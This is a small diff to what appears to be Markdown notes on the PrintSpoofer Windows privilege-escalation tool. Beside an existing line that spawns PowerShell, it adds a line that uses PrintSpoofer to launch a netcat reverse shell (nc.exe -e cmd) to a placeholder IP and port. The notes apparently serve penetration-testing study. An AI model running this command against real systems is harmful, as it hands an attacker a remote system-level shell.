@@ -25,6 +25,8 @@ https://github.com/itm4n/PrintSpoofer
 
 ```
 PrintSpoofer.exe -i -c powershell.exe
+
+PrintSpoofer32.exe -i -c "nc.exe <IP> <PORT> -e cmd"
 ```
 
 
